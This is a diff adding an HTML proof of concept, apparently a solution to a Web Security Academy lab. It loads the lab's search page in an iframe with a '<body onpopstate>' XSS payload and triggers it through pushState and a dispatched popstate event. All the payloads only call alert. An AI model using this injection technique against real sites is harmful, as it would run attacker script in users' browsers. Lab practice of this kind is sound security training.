@@ -1,0 +1,30 @@
+<script>
+    function a(iframe) {
+        console.log("inside onload")
+        console.log(iframe)
+
+        iframe.history.pushState({}, '', "/");
+        var popStateEvent = new PopStateEvent('popstate', { state: {} });
+        dispatchEvent(popStateEvent);
+    }
+</script>
+<iframe id="haha"
+    src='https://0ab800360434066dc0178acf003f000a.web-security-academy.net/?SearchTerm=<body+onpopstate%3d"alert(1)">'
+    onload="a(this.contentWindow)">
+</iframe>
+<script src="https://code.jquery.com/jquery-3.6.1.slim.min.js" integrity="sha256-w8CvhFs7iHNVUtnSP0YKEg00p9Ih13rlL9zGqvLdePA=" crossorigin="anonymous"></script>
+<script>
+    var iframe = document.getElementById('haha'),
+        iframeWin = iframe.contentWindow || iframe,
+        iframeDoc = iframe.contentDocument || iframeWin.document;
+
+    window.hello = function () {
+        alert('hello from owner!');
+    };
+
+    $(iframeDoc).ready(function (event) {
+        iframeDoc.open();
+        iframeDoc.write('\<script>alert("hello from iframe!");\<\/script>');
+        iframeDoc.close();
+    });
+</script>
